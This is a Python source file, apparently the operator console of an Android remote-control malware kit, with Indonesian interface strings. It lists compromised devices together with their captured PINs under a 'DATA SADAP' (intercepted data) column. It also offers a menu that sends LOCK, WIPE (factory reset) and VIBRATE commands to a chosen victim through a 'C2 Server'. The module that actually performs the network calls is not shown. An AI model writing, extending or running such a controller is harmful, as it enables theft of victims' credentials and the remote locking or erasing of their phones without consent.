import time
import sys
from config import Config
from core.colors import Colors as C
from core.banner import get_banner
from core.engine import Engine

def dashboard():
    get_banner()
    targets = Engine.fetch_targets()
    
    print(f"{C.R}ID   {C.W}| {C.R}DEVICE/MODEL         {C.W}| {C.R}COMMAND  {C.W}| {C.R}DATA SADAP")
    print(f"{C.W}─────┼──────────────────────┼──────────┼────────────────────────────")

    valid_ids = []
    if targets:
        for v in targets:
            tid = v.get('id')
            dev = v.get('Device', 'Unknown')[:20]
            cmd = v.get('last_command', 'NONE')
            pin = v.get('Pin', 'Empty')[:28]
            valid_ids.append(str(tid))
            print(f"{C.Y}{tid:<4} {C.W}| {C.C}{dev:<20} {C.W}| {C.M}{cmd:<8} {C.W}| {C.G}{pin}")
    else:
        print(f"      {C.Y}Listening... Belum ada target terdeteksi.")

    print(f"\n{C.W}[{C.G}C{C.W}] Control Target  |  [{C.G}R{C.W}] Refresh  |  [{C.R}E{C.W}] Exit")
    return valid_ids

def control_menu(target_id):
    get_banner()
    print(f"{C.Y}PUSAT KONTROL TARGET ID: {target_id}")
    print(f"{C.W}──────────────────────────────────────────────────────────")
    print(f"{C.W}[1] {C.R}LOCK SCREEN      {C.W}(Paksa Kunci HP)")
    print(f"{C.W}[2] {C.R}WIPE DATA        {C.W}(Factory Reset)")
    print(f"{C.W}[3] {C.C}VIBRATE          {C.W}(Tes Getar)")
    print(f"{C.W}[4] {C.Y}CLEAR COMMAND    {C.W}(Normal Kembali)")
    print(f"{C.W}[0] {C.W}BACK")
    
    opt = input(f"\n{C.R}XPL-CMD > {C.W}")
    cmds = {"1": "LOCK", "2": "WIPE", "3": "VIBRATE", "4": "NONE"}
    
    if opt in cmds:
        if Engine.send_action(target_id, cmds[opt]):
            print(f"{C.G}[+] Command {cmds[opt]} Sukses Terkirim!")
            Engine.save_log(f"ID {target_id} executed {cmds[opt]}")
        else:
            print(f"{C.R}[!] Gagal Terhubung ke C2 Server.")
        time.sleep(2)
    elif opt == "0": return

def run():
    while True:
        ids = dashboard()
        choice = input(f"\n{C.C}Choice > {C.W}").lower()
        if choice == 'c':
            tid = input(f"{C.Y}Masukkan ID Target: {C.W}")
            if tid in ids: control_menu(tid)
            else:
                print(f"{C.R}[!] ID Tidak Valid."); time.sleep(1)
        elif choice == 'e': sys.exit()
        elif choice == 'r': continue

if __name__ == "__main__":
    try: run()
    except KeyboardInterrupt: sys.exit()
